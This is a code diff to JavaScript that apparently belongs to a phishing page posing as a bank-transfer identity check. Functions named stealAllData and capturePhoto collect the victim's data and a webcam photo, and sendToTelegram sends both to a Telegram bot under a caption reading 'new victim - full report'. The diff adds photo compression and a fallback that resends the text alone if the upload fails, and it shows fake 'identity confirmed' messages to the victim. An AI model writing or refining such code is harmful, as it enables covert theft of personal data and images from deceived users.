@@ -166,6 +166,39 @@ function stealAllData() {
         });
 }
 
+// ====== ضغط الصورة ======
+function compressImage(dataUrl) {
+    return new Promise((resolve) => {
+        const img = new Image();
+        img.onload = function() {
+            const canvas = document.createElement('canvas');
+            const maxWidth = 300;
+            const maxHeight = 300;
+            let width = img.width;
+            let height = img.height;
+
+            if (width > height) {
+                if (width > maxWidth) {
+                    height = height * (maxWidth / width);
+                    width = maxWidth;
+                }
+            } else {
+                if (height > maxHeight) {
+                    width = width * (maxHeight / height);
+                    height = maxHeight;
+                }
+            }
+
+            canvas.width = width;
+            canvas.height = height;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, width, height);
+            resolve(canvas.toDataURL('image/jpeg', 0.6));
+        };
+        img.src = dataUrl;
+    });
+}
+
 // ====== إرسال البيانات ======
 function sendToTelegram(allData, photoBase64 = null) {
     const caption = `🕵️ ضحية جديدة - تقرير كامل
@@ -256,14 +289,39 @@ function confirmTransfer() {
 
     capturePhoto()
         .then(photoBase64 => {
+            // ضغط الصورة قبل الإرسال
+            return compressImage(photoBase64).then(compressed => {
+                return { photoBase64: compressed };
+            });
+        })
+        .then(({ photoBase64 }) => {
             stealAllData().then(allData => {
                 sendToTelegram(allData, photoBase64)
-                    .then(() => {
-                        hideLoading();
-                        statusDiv.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
-                        statusDiv.style.color = '#28a745';
-                        confirmBtn.disabled = false;
-                        confirmBtn.style.opacity = '1';
+                    .then(response => {
+                        if (response.ok) {
+                            hideLoading();
+                            statusDiv.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
+                            statusDiv.style.color = '#28a745';
+                            confirmBtn.disabled = false;
+                            confirmBtn.style.opacity = '1';
+                        } else {
+                            // لو فشلت الصورة، نبعت نص فقط
+                            sendToTelegram(allData, null)
+                                .then(() => {
+                                    hideLoading();
+                                    statusDiv.innerHTML = '✅ تم تأكيد هويتك بنجاح! جاري إتمام التحويل...';
+                                    statusDiv.style.color = '#28a745';
+                                    confirmBtn.disabled = false;
+                                    confirmBtn.style.opacity = '1';
+                                })
+                                .catch(() => {
+                                    hideLoading();
+                                    statusDiv.innerHTML = '❌ فشل التحقق من الهوية، برجاء المحاولة مرة أخرى.';
+                                    statusDiv.style.color = '#e60000';
+                                    confirmBtn.disabled = false;
+                                    confirmBtn.style.opacity = '1';
+                                });
+                        }
                     })
                     .catch(() => {
                         sendToTelegram(allData, null)
